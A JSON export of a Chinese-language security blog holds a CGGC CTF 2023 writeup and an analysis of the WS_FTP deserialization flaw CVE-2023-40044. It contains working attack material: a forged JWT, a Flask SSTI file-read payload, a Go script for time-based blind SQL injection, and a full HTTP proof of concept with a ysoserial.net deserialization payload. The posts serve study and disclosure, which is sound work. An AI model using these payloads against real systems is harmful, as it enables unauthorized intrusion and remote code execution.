[{"content":"","date":"2023-12-09","permalink":"/tags/2023/","section":"Tags","summary":"","title":"2023"},{"content":"","date":"2023-12-09","permalink":"/tags/cggc/","section":"Tags","summary":"","title":"CGGC"},{"content":"[Web] bossti # Description:\nI wish you were a boss wannabe.\n明顯就是要竄改 JWT 來登入\nJWT 解開後，簽名的 Secret 是空值。\n把 JWT 改成題目提示的 boss。\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYm9zcyIsImhhY2siOiIifQ.VhS5VSRlR_RrgIlF-gdl-s1_PVHPQCxB3s8oHgwEPJ4 登入之後變成 SSTI 的題目，透過 Wappalyzer 知道他是 Python Flask，所以要找 Python 的 SSTI payload 來試。\n在 hack 欄位用上 {{ 7*6 }}，結果伺服器幫我們算好 42，確定存在 SSTI。\nhttp://10.99.111.109:5000/boss?data={%27user_id%27%3A+1,+%27role%27%3A+%27boss%27,+%27hack%27%3A+%27{{7*6}}%27} 題目要我們嘗試找到 Flag.txt，所以找一下讀檔的 payload。本來應該要找到方法 list files，但通靈當前目錄中了就不需要了。\nhttp://10.99.111.109:5000/boss?data={%27user_id%27%3A+1,+%27role%27%3A+%27boss%27,+%27hack%27%3A+%27{{get_flashed_messages.__globals__.__builtins__.open(%22Flag.txt%22).read()}}%27} flag: CGGC{\u0026quot;S$T1_V3RY_EZ_2_Pwn3D_C0ngr4t$\u0026quot;} [MISC] Space game # Description:\nPlay a fun space game and try to get a high score. Move using the arrow keys and press \u0026lsquo;Z\u0026rsquo; to attack.\nbinjgb 是一個 gameboy 模擬器，從 github 上看說要把 .gb 檔案放到伺服器上。\n姑且看一下開發工具記錄到的載入請求，發現有把 game.gb 下載到瀏覽器上，然後 flag 就藏在裡面。\nflag: CGGC{Y0U_WIN!!123} [Reverse] GaoYi # Description:\nAnyone can participate with three million US dollars.\n一個執行檔，要跟高義賭兩局，贏了才有 flag。\nmain 函數，有兩場賭局，把使用者輸入讀進來後再判斷勝負。\n我們要的 flag 在 readFlag()。\nreadFlag() 裡面在算 flag，本想自己算一遍，但覺得太蠢。\n解題思路是嘗試跳過中間的賭局，直接給我 flag 吧！所以要跳到 0x00401e3c，讓他直接算 flag。\n腦筋動到 main 函數一開始的地方，試試看直接跳。\n原本的指令 eb6a 改成 e939040000。\n修改 binary。\nTada!\nflag: CGGC{J00_sh4ll_n07_sH1P_S3cR37S_70_cuS70M3r} [Web] Flag Slot Machine # Description:\nIf you\u0026rsquo;re lucky enough, you\u0026rsquo;ll be able to get the flag.\n// flag.php \u0026lt;?php include_once(\u0026#34;config.php\u0026#34;); if(isset($_GET[\u0026#34;secret\u0026#34;])) { $pwd = $_GET[\u0026#34;secret\u0026#34;]; $dbname = \u0026#39;secret_db\u0026#39;; $conn = new mysqli(HOST, DBUSER, DBPASS, $dbname); if ($conn-\u0026gt;connect_error) { die(\u0026#39;Connection failed: \u0026#39; . $conn-\u0026gt;connect_error); } $stmt = $conn-\u0026gt;prepare(\u0026#34;SELECT * FROM s3cret_table\u0026#34;); $stmt-\u0026gt;execute(); $result = $stmt-\u0026gt;get_result(); $response = array(\u0026#34;data\u0026#34; =\u0026gt; generateRandomString(strlen($flag))); if ($result-\u0026gt;num_rows \u0026gt; 0) { $res = $result-\u0026gt;fetch_assoc(); if($res[\u0026#34;secret\u0026#34;] == $pwd) $response = array(\u0026#34;data\u0026#34; =\u0026gt; $flag); // \u0026lt;-- flag here } flag.php 要我們提供 secret 在 GET 參數中，如果符合 DB 中的 secret 就可以拿到 flag。\n// login.php \u0026lt;?php include_once(\u0026#34;config.php\u0026#34;); fingerprint_check(); if(isset($_POST[\u0026#39;user\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;pwd\u0026#39;])) { $user = $_POST[\u0026#39;user\u0026#39;]; $pwd = $_POST[\u0026#39;pwd\u0026#39;]; } else { $user = $pwd = \u0026#34;\u0026#34;; } //... if($user != \u0026#34;\u0026#34; \u0026amp;\u0026amp; $pwd != \u0026#34;\u0026#34;) { $dbname = \u0026#39;slot_db\u0026#39;; $conn = new mysqli(HOST, DBUSER, DBPASS, $dbname); if ($conn-\u0026gt;connect_error) { die(\u0026#39;Connection failed: \u0026#39; . $conn-\u0026gt;connect_error); } $conn-\u0026gt;set_charset(\u0026#34;utf8\u0026#34;); $stmt = $conn-\u0026gt;prepare(\u0026#34;SELECT * FROM users WHERE username = \u0026#39;\u0026#34; . $user . \u0026#34;\u0026#39; and password = \u0026#39;\u0026#34; . md5($pwd) . \u0026#34;\u0026#39;\u0026#34;); // \u0026lt;-- SQLi here $stmt-\u0026gt;execute(); $result = $stmt-\u0026gt;get_result(); if ($result-\u0026gt;num_rows \u0026gt; 0) { $res = $result-\u0026gt;fetch_assoc(); $_SESSION[\u0026#39;login\u0026#39;] = $res[\u0026#34;username\u0026#34;]; echo \u0026#34;\u0026lt;div\u0026gt;Login successful!\u0026lt;/div\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;script\u0026gt;setTimeout(function(){ window.location.href = \u0026#39;index.php\u0026#39;; }, 1000);\u0026lt;/script\u0026gt;\u0026#34;; } else { echo \u0026#34;\u0026lt;div class=\\\u0026#34;alert alert-danger\\\u0026#34; role=\\\u0026#34;alert\\\u0026#34;\u0026gt;Login failed! QAQ\u0026lt;/div\u0026gt;\u0026#34;; } login.php 存在一個 SQL injection 漏洞，但很遺憾的是它並沒有回顯，因此我們不能直接把 DB 中的資料挖出來顯示到網頁上。\n// config.php \u0026lt;?php session_start(); define(\u0026#34;FINGERPRINT\u0026#34;, \u0026#34;771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,23-65281-10-11-35-16-5-13-18-51-45-43-27-17513,29-23-24,0\u0026#34;); define(\u0026#34;DBUSER\u0026#34;, \u0026#34;kaibro\u0026#34;); define(\u0026#34;DBPASS\u0026#34;, \u0026#34;superbig\u0026#34;); define(\u0026#34;HOST\u0026#34;, \u0026#34;localhost\u0026#34;); $flag = \u0026#39;CGGC{fake_flag}\u0026#39;; function session_check() { if(!isset($_SESSION[\u0026#39;login\u0026#39;]) || $_SESSION[\u0026#39;login\u0026#39;] == \u0026#34;\u0026#34;) { header(\u0026#34;Location: login.php\u0026#34;); die(\u0026#34;Plz login\u0026#34;); } } function fingerprint_check() { if($_SERVER[\u0026#39;HTTP_SSL_JA3\u0026#39;] !== FINGERPRINT) die(\u0026#34;Bad hacker! Wrong fingerprint!\u0026#34;); } 在開始嘗試登入前，我們會先被 JA3 指紋給擋住。這題在 Balsn CTF 出過，可以參考以下 writeup。一開始是跟 writeup 一樣用 NodeJS，但 NodeJS 的非同步執行實在是很難處理，所以請用 Go 的版本。\nhttps://ctftime.org/writeup/37976 use mysql; CREATE USER \u0026#39;kaibro\u0026#39;@\u0026#39;localhost\u0026#39; IDENTIFIED BY \u0026#39;superbig\u0026#39;; GRANT SELECT ON *.* TO \u0026#39;kaibro\u0026#39;@localhost IDENTIFIED BY \u0026#39;superbig\u0026#39; WITH GRANT OPTION; FLUSH PRIVILEGES; CREATE DATABASE slot_db; use slot_db; DROP TABLE IF EXISTS `users`; CREATE TABLE `users` ( `id` int(11) DEFAULT NULL, `username` text, `password` text ) ENGINE=MyISAM DEFAULT CHARSET=latin1; LOCK TABLES `users` WRITE; INSERT INTO `users` VALUES (1, \u0026#39;kaibro\u0026#39;, \u0026#39;4647570f7638e378e490db41c24c800a\u0026#39;); UNLOCK TABLES; CREATE DATABASE secret_db; use secret_db; DROP TABLE IF EXISTS `s3cret_table`; CREATE TABLE `s3cret_table` ( `id` int(11) DEFAULT NULL, `secret` text ) ENGINE=MyISAM DEFAULT CHARSET=latin1; LOCK TABLES `s3cret_table` WRITE; INSERT INTO `s3cret_table` VALUES (1, \u0026#39;meowmeowmeow\u0026#39;); UNLOCK TABLES; SQL injection 用 UNION SELECT 要先找出欄位數量，題目有給 DB 結構，所以直接就知道是三個。然後我們想要 secret_db.s3cret_table 的 secret，因為沒辦法直接顯示出來，只能一個字一個字去比對出來。第一步我們想先知道 secret 的長度，這裡只能用 Time-based 的方法，當條件成真時 sleep() 幾秒，試了幾次後知道長度是 32。\nuser=kaibro' UNION Select 1,2,IF(length(secret)=32,SLEEP(5),0) FROM secret_db.s3cret_table WHERE id=1 -- '\u0026amp;pwd=123' 接下來就是開始暴力比對密碼，一個字一個字拿出來比對 ASCII 碼，然後要注意的是 secret 每一段時間就會更新，所以千萬不要手動比對(對\u0026hellip;.我就浪費時間手動比對，也剛好知道可能字串是 [0-9a-f])，這邊也呼應前面所說的請用 Go 版本，因為 GO 比較好算時間差。\npackage main import ( \u0026#34;fmt\u0026#34; \u0026#34;github.com/Danny-Dasilva/CycleTLS/cycletls\u0026#34; \u0026#34;strconv\u0026#34; \u0026#34;time\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;crypto/tls\u0026#34; \u0026#34;io/ioutil\u0026#34; ) func main() { client := cycletls.Init() // secret length = 32 // Body: \u0026#39;user=kaibro\u0026#39; UNION Select 1,2,IF(length(secret)=32,SLEEP(5),0) FROM secret_db.s3cret_table WHERE id=1 -- \u0026#39;\u0026amp;pwd=123\u0026#39;, secret := \u0026#34;\u0026#34; chars := \u0026#34;abcdef1234567890\u0026#34; for len(secret) \u0026lt; 32 { for _, char := range chars { payload := \u0026#34;user=kaibro\u0026#39; UNION Select 1,IF(SUBSTRING(secret,\u0026#34; + strconv.Itoa(len(secret)+1) + \u0026#34;,1) = CHAR(\u0026#34; + strconv.Itoa(int(char)) + \u0026#34;),SLEEP(2),null),3 FROM secret_db.s3cret_table WHERE id=1 -- \u0026#39;\u0026amp;pwd=123\u0026#34; //fmt.Println(payload) start := time.Now() _, err := client.Do(\u0026#34;https://10.99.111.111:8787/login.php\u0026#34;, cycletls.Options{ Body : payload, Ja3: \u0026#34;771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,23-65281-10-11-35-16-5-13-18-51-45-43-27-17513,29-23-24,0\u0026#34;, UserAgent: \u0026#34;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0\u0026#34;, Headers: map[string]string{ \u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;, }, InsecureSkipVerify: true, }, \u0026#34;POST\u0026#34;); if err != nil { fmt.Print(\u0026#34;Request Failed: \u0026#34; + err.Error()) } elapsed := time.Since(start) //fmt.Println(elapsed) if (elapsed \u0026gt;= 2000000000) { secret = secret + string(char) fmt.Println(secret) break } } } http.DefaultTransport.(*http.Transport).TLSClientConfig = \u0026amp;tls.Config{InsecureSkipVerify: true} response, err := http.Get(\u0026#34;https://10.99.111.111:8787/flag.php?secret=\u0026#34; + secret) if err != nil { fmt.Print(\u0026#34;Request Failed: \u0026#34; + err.Error()) } // read response body body, error := ioutil.ReadAll(response.Body) if error != nil { fmt.Println(error) } // close response body response.Body.Close() // print response body fmt.Println(string(body)) } 暴力比對完後拿 secret 去餵 flag.php，就可以拿到 flag 了。\n[MISC] Link list # Description:\nDO you know how automatic destination file work? (The flag is separarted into four parts)\n在檔案最下面發現 last part\nC:\\Challenge\\_l457_p4r7_15_h1dd3n!} 用 l l e n g e \\ 後面的 path 才能找到順序正確的 flag 片段，用 C:\\Challenge\\ 找的話順序會跑掉。\nF L A G IS Pr ob bly Here! Youre Clo se Here It is_ CG GC{ 3 z _f 1 r5 7_ qu 4 r 7 3r _ CGGC{3z_f1r57_qu4r73r_ 這 part 則是把 PowerShell script 拿出來執行就可以了。\nC:\\\u0026gt; $t=\u0026#39;aRB3BDtBNRAiBGFBNBA2BGVB[tB0BDdBNRAzBDRB[tBtBD7BNtB\u0026gt;\u0026#39;;for(($i=0);$i-lt$t.Length;$i++){$k+=[char]($t[$i]-bxor3)};[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($k)) m4l1c10u5_7h1rd_0n3 m4l1c10u5_7h1rd_0n3 最後就剩下 second part 卡關了，所以這題沒解出來:(\nCGGC{3z_f1r57_qu4r73r_ m4l1c10u5_7h1rd_0n3 _l457_p4r7_15_h1dd3n!} ","date":"2023-12-09","permalink":"/posts/cggc+ctf+2023+writeup/","section":"Posts","summary":"[Web] bossti # Description:\nI wish you were a boss wannabe.\n明顯就是要竄改 JWT 來登入\nJWT 解開後，簽名的 Secret 是空值。\n把 JWT 改成題目提示的 boss。","title":"CGGC CTF 2023 初賽 Writeup"},{"content":"","date":"2023-12-09","permalink":"/tags/ctf/","section":"Tags","summary":"","title":"CTF"},{"content":"","date":"2023-12-09","permalink":"/","section":"KinJih's space","summary":"","title":"KinJih's space"},{"content":"","date":"2023-12-09","permalink":"/posts/","section":"Posts","summary":"","title":"Posts"},{"content":"","date":"2023-12-09","permalink":"/tags/","section":"Tags","summary":"","title":"Tags"},{"content":"","date":"2023-10-08","permalink":"/tags/cve/","section":"Tags","summary":"","title":"CVE"},{"content":"漏洞簡介 # 在 WS_FTP Server 8.7.4 和 8.8.2 之前的版本，未經身分驗證的攻擊者可以在 Ad Hoc Transfer 模組中利用 .NET 反序列化漏洞，在 WS_FTP Server 系統上進行遠端命令執行。值得注意的是，WS_FTP Server 的 Ad Hoc Transfer 模組是標準安裝的一部分，大部分的 WS_FTP Server 都會受影響。Progress Software 的建議是所有客戶都要升級到最新的軟體版本，或者刪除/停用 Ad Hoc Transfer 模組。\n此漏洞是由 Assetnote 所發現，未經身分驗證的攻擊者很容易就能在目標系統上實現 RCE。\nRapid7 觀察到此漏洞在野外已經被利用了。而且，CISA 也根據主動利用的證據，將暴露情況加入到其 已知被利用的漏洞目錄 (Known Exploited Vulnerabilities Catalog) 之中。\n此漏洞的 CVE 編號已被指定為 CVE-2023-40044，其 CVSSv3 評分至少為 8.8，嚴重度高。\n受影響的產品 # 如果啟用了 Ad Hoc Transfer 模組，則以下軟體版本都會受到影響：\n2022.0.1 (8.8.1) 2022.0 (8.8.0) 2020.0.0 (8.7.0) 2020.0.1 (8.7.1) 2020.0.2 (8.7.2) 2020.0.3 (8.7.3) 分析 # FormStream Class # 這個漏洞的根本原因是不安全的反序列化。存在漏洞的 DeserializeProcessor() 方法嘗試反序列化使用者可控，且沒有經過檢查或確認的資料。\ninternal IFileProcessor DeserializeProcessor(string input) { BinaryFormatter binaryFormatter = new BinaryFormatter(); MemoryStream serializationStream1 = new MemoryStream(Convert.FromBase64String(input)); SettingsStorageObject settingsStorageObject = (SettingsStorageObject) binaryFormatter.Deserialize((Stream) serializationStream1); // \u0026lt;-- 不安全的反序列化 嘗試往前追會發現 DeserializeProcessor() 方法被 CheckForActionFields() 方法所呼叫。而 CheckForActionFields() 方法會嘗試提取 multipart 欄位中 ::AHT_DEFAULT_UPLOAD_PARAMETER:: 之後的字串，然後將該字串交給 DeserializeProcessor() 方法進行反序列化。\n此外, ::AHT_UPLOAD_PARAMETER:: 的存在似乎也會觸發相同的不安全反序列化過程。\nprivate void CheckForActionFields() { byte[] array = this._currentField.ToArray(); string result1 = string.Empty; int boundaryPos = this.IndexOf(array, this.BOUNDARY); if (!this.TryParseActionField(this.ID_TAG, array, out result1, boundaryPos)) { string result2 = string.Empty; if (this.TryParseActionField(this.DEFAULT_PARAMS_TAG, array, out result2, boundaryPos)) // \u0026lt;-- ::AHT_DEFAULT_UPLOAD_PARAMETER:: { this._defaultProcessor = UploadManager.Instance.DeserializeProcessor(result2.Substring(this.DEFAULT_PARAMS_TAG.Length)); // \u0026lt;-- 不安全的反序列化 this._processor = this._defaultProcessor; this._currentField = new MemoryStream(); } else if (this.TryParseActionField(this.PARAMS_TAG, array, out result2, boundaryPos)) // \u0026lt;-- ::AHT_UPLOAD_PARAMETER:: { this._processor = UploadManager.Instance.DeserializeProcessor(result2.Substring(this.PARAMS_TAG.Length)); // \u0026lt;-- 不安全的反序列化 this._currentField = new MemoryStream(); } 要到達 CheckForActionFields() 方法，需要依序呼叫 ProcessField() 和 Write() 方法。\nprivate FormStream.SectionResult ProcessField(byte[] bytes, int pos) { int nextOffset1 = -1; if (pos \u0026lt; bytes.Length - 1) { nextOffset1 = this.IndexOf(bytes, this.BOUNDARY, pos + 1); if (nextOffset1 != -1 \u0026amp;\u0026amp; this._inFile) nextOffset1 -= 2; } if (nextOffset1 \u0026gt;= 0) { this.WriteBytes(this._inFile, bytes, pos, nextOffset1 - pos); if (!this._inFile) this.CheckForActionFields(); // \u0026lt;-- 存在漏洞的方法 Write() 方法會遍歷 HTTP form-data，搜尋邊界字串並解析每個欄位的標頭。 要觸發 ProcessField() 方法，必須滿足以下條件：\nthis._inField 必須為 true multipart 欄位的標頭不能包含 filename 以及 Content-Disposition this._inFile 必須是 false public override void Write(byte[] bytes, int offset, int count) { int num1 = 0; byte[] numArray; if (this._buffer != null) { numArray = new byte[this._buffer.Length + count]; Buffer.BlockCopy((Array) this._buffer, 0, (Array) numArray, 0, this._buffer.Length); Buffer.BlockCopy((Array) bytes, offset, (Array) numArray, this._buffer.Length, count); } else { numArray = new byte[count]; Buffer.BlockCopy((Array) bytes, offset, (Array) numArray, 0, count); } this._position += (long) count; int srcOffset; int num2; FormStream.SectionResult sectionResult; do { if (this._headerNeeded) { srcOffset = num1; num2 = this.IndexOf(numArray, this.BOUNDARY, num1); if (num2 \u0026gt;= 0) { if (this.IndexOf(numArray, this.EOF, num2) != num2) { int num3 = this.IndexOf(numArray, this.EOH, num2); if (num3 \u0026gt;= 0) { this._inField = true; // \u0026lt;-- _inField = true this._headerNeeded = false; Dictionary\u0026lt;string, string\u0026gt; header = this.ParseHeader(numArray, num2); if (header != null) { if (header.ContainsKey(\u0026#34;filename\u0026#34;) \u0026amp;\u0026amp; header.ContainsKey(\u0026#34;Content-Disposition\u0026#34;)) // \u0026lt;-- 必須是 false { string fileName = header[\u0026#34;filename\u0026#34;].Trim(\u0026#39;\u0026#34;\u0026#39;).Trim(); if (!string.IsNullOrEmpty(fileName)) { try { this._fileName = header[\u0026#34;filename\u0026#34;].Trim(\u0026#39;\u0026#34;\u0026#39;); this._inFile = true; string contentType = !header.ContainsKey(\u0026#34;Content-Type\u0026#34;) ? \u0026#34;application/octet-stream\u0026#34; : header[\u0026#34;Content-Type\u0026#34;]; this.fileProccessingEnded = false; object identifier = this._processor.StartNewFile(fileName, contentType, header, this._previousFields); this.OnFileStarted(fileName, identifier); } catch (Exception ex) { this._fileError = true; this.OnError(ex); } } } else { this._inFile = false; // \u0026lt;-- _inFile = false this._currentField = new MemoryStream(); this._currentFieldName = header[\u0026#34;name\u0026#34;]; } num1 = num3 + 4; } else goto label_9; } else goto label_17; } else goto label_6; } else goto label_18; } if (this._inField) { this._buffer = (byte[]) null; sectionResult = this.ProcessField(numArray, num1); // \u0026lt;-- 存在漏洞的方法 UploadModule Class # UploadModule 確定傳入的 HTTP 請求是否是 multipart 檔案上傳。如果是 multipart 檔案上傳，Context_AcquireRequestState() 方法將會建立一個FormStream物件，該物件會呼叫 Write() 方法來處理此請求。\npublic class UploadModule : IHttpModule { private void Context_AcquireRequestState(object sender, EventArgs e) { // ... string boundary = \u0026#34;--\u0026#34; + knownRequestHeader.Substring(knownRequestHeader.IndexOf(\u0026#34;boundary=\u0026#34;) + \u0026#34;boundary=\u0026#34;.Length); using (FormStream formStream = new FormStream(this.GetProcessor(), boundary, app.Request.ContentEncoding)) { formStream.FileCompleted += new FileEventHandler(this.fs_FileCompleted); formStream.FileCompletedError += new FileErrorEventHandler(this.fs_FileCompletedError); formStream.FileStarted += new FileEventHandler(this.fs_FileStarted); formStream.Error += new ErrorEventHandler(this.OnTransactionAborted); this._context = app.Context; long bytes = 0; if (workerRequest.GetPreloadedEntityBodyLength() \u0026gt; 0) { byte[] preloadedEntityBody = workerRequest.GetPreloadedEntityBody(); formStream.Write(preloadedEntityBody, 0, preloadedEntityBody.Length); // \u0026lt;-- 存在漏洞的方法 在 WS_FTP Ad Hoc Transfer 應用程式的 web.config 中，MyFileUpload.UploadModule 模組會被載入到 IIS HTTP 模組中，並處理傳入的檔案上傳請求。因此，發送至 Ad Hoc Transfer 模組中以 /AHT/ 為開頭的 URI 的 multipart HTTP 請求都可能觸發漏洞。\n\u0026lt;httpModules\u0026gt; \u0026lt;add name=\u0026#34;extend_session_module\u0026#34; type=\u0026#34;AHT.Main.ExtendUserSessionModule\u0026#34; /\u0026gt; \u0026lt;add name=\u0026#34;upload_module\u0026#34; type=\u0026#34;MyFileUpload.UploadModule, fileuploadlibrary, Version=4.0.0.0\u0026#34; /\u0026gt; \u0026lt;/httpModules\u0026gt; PoC # 利用 ysoserial.net 來產生 .NET 反序列化酬載：\n.\\ysoserial.exe -g TextFormattingRunProperties -f BinaryFormatter -c \u0026#34;notepad.exe\u0026#34; -o base64 HTTP multipart POST 請求：\nPOST /AHT/AhtApiService.asmx/AuthUser HTTP/1.1 Host: victim.com User-Agent: CVE-2023-40044 Accept: */* Content-Length: 1303 Content-Type: multipart/form-data; boundary=boundary --boundary name: PoC ::AHT_DEFAULT_UPLOAD_PARAMETER::AAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAAugU8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtMTYiPz4NCjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIElzSW5pdGlhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6c2Q9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiPg0KICA8T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KICAgIDxzZDpQcm9jZXNzPg0KICAgICAgPHNkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgICAgICA8c2Q6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIG5vdGVwYWQuZXhlIiBTdGFuZGFyZEVycm9yRW5jb2Rpbmc9Int4Ok51bGx9IiBTdGFuZGFyZE91dHB1dEVuY29kaW5nPSJ7eDpOdWxsfSIgVXNlck5hbWU9IiIgUGFzc3dvcmQ9Int4Ok51bGx9IiBEb21haW49IiIgTG9hZFVzZXJQcm9maWxlPSJGYWxzZSIgRmlsZU5hbWU9ImNtZCIgLz4NCiAgICAgIDwvc2Q6UHJvY2Vzcy5TdGFydEluZm8+DQogICAgPC9zZDpQcm9jZXNzPg0KICA8L09iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCjwvT2JqZWN0RGF0YVByb3ZpZGVyPgs= --boundary– 參考資料 # https://community.progress.com/s/article/WS-FTP-Server-Critical-Vulnerability-September-2023 https://www.assetnote.io/resources/research/rce-in-progress-ws-ftp-ad-hoc-via-iis-http-modules-cve-2023-40044 https://attackerkb.com/topics/bn32f9sNax/cve-2023-40044/rapid7-analysis ","date":"2023-10-08","permalink":"/posts/progress+ws_ftp+server+rce-cve-2023-40044/","section":"Posts","summary":"漏洞簡介 # 在 WS_FTP Server 8.7.4 和 8.8.2 之前的版本，未經身分驗證的攻擊者可以在 Ad Hoc Transfer 模組中利用 .NET 反序列化漏洞，在 WS_FTP Server 系統上進行遠端命令執行。值得注意的是，WS_FTP Server 的 Ad Hoc Transfer 模組是標準安裝的一部分，大部分的 WS_FTP Server 都會受影響。Progress Software 的建議是所有客戶都要升級到最新的軟體版本，或者刪除/停用 Ad Hoc Transfer 模組。","title":"Progress WS_FTP Server 不安全的反序列化漏洞(CVE-2023-40044)"},{"content":"","date":"2023-10-08","permalink":"/tags/rce/","section":"Tags","summary":"","title":"RCE"},{"content":"","date":"2023-10-08","permalink":"/tags/ws_ftp/","section":"Tags","summary":"","title":"WS_FTP"},{"content":"拖延症末期患者遲早會寫的\n","date":"0001-01-01","permalink":"/about/","section":"KinJih's space","summary":"拖延症末期患者遲早會寫的","title":"About Me"},{"content":"","date":"0001-01-01","permalink":"/authors/","section":"Authors","summary":"","title":"Authors"},{"content":"","date":"0001-01-01","permalink":"/categories/","section":"Categories","summary":"","title":"Categories"},{"content":"","date":"0001-01-01","permalink":"/series/","section":"Series","summary":"","title":"Series"}]